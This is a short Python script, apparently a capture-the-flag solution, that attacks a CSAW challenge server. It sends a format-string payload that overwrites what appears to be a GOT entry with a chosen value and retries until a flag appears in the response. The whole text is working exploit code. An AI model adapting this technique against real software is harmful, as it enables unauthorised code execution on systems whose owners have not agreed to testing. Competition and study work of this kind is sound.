def pwn():
    for i in range(5):
        p = remote("pwn.chal.csaw.io", 8000)
        p.recvuntil(b"GOT milk? ")
        target = 0x1189
        payload = p32(0x804a010)
        payload += b"%" + str(target - 4).encode() + b"c%7$hn"
        p.sendline(payload)
        data = p.recvall(timeout=5)
        print("Try", i, "FLAG FOUND:", b"flag" in data.lower())
        if b"flag" in data.lower():
            print(repr(data))
            break
        p.close()

pwn()
